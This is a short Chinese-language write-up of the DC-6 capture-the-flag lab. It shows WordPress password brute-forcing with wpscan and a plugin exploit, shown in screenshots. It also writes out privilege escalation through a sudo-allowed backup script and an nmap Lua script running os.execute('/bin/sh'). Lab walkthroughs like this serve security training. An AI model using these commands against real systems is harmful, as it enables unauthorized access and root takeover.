# DC6 
## 简述  
wordpress 通过密码爆破进入 使用带有漏洞的插件拿到shell 进行提权 
## 服务发现和漏洞   
同样需要设置hosts别忘记了  
```
wpscan --url http://wordy/ -P passwords.txt
```
### 插件漏洞
![20191129191618.png](https://i.loli.net/2019/11/29/BrWy1xzZcJROk9i.png)
查询其中的插件，发现其中的插件存在漏洞  
![20191129192713.png](https://i.loli.net/2019/11/29/xaGgBcMAkXZ3zu7.png)
然后使用这个漏洞进入
![20191129193217.png](https://i.loli.net/2019/11/29/QCqJdaAk3thxuys.png)
拿到权限最普通的权限  



## 提权   
### 翻看数据信息  
![20191129193431.png](https://i.loli.net/2019/11/29/42qdmoWja1K5Nx6.png)  
翻到其中的数据然后使用ssh进行登录  
![20191129194444.png](https://i.loli.net/2019/11/29/hUrbutzey9qsIw1.png)  
这里的意思之前是理解错了 实际的意思是说你可以使用jens 运行backups.sh这个脚本，但是你不是jens 但是你可以使用sudo -u 指定用户这样也是可以的，在那其中sh脚本当中写入 /bin/sh  
![20191129195643.png](https://i.loli.net/2019/11/29/bitaprcvXP7IegS.png)  
这样你就是jens了  
又进行提示了  
```
用某个用户执行某个命令  
sudo -u username *.sh 
```
![20191129195810.png](https://i.loli.net/2019/11/29/tQjM5428mvulbkH.png)
### nmap 提权
网上说的nmap提权一般有两种
1. 版本比较老  
![20191129220202.png](https://i.loli.net/2019/11/29/Qt5P3iemnRg1Ab8.png)
2. 版本比较新  
![20191129220617.png](https://i.loli.net/2019/11/29/eT8aklQdBfscxqI.png)
别忘了 sudo 
![20191129220743.png](https://i.loli.net/2019/11/29/PTEshGNWMebq4Sv.png)    
```
TK =$(mktemp)
echo 'os.execute("/bin/sh")' >$TK  
nmap --script=$TK
```
## 总结  
前端存在漏洞的插件，翻看服务器数据拿到一个key，登录上去之后使用sudo- u  的方法并且修改脚本当中的内容从而转换成了另外一个用户，最后使用sudo -l 的nmap操作进行提权  
### 操作  
wpscan --url http://wordy/ -P passwords.txt  -api vt  查询网站当中的漏洞插件  
sudo -l 查询不使用sudo就能执行的命令  
nmap提权  
TK =$(mktemp)
echo 'os.execute("/bin/sh")' >$TK  
nmap --script=$TK


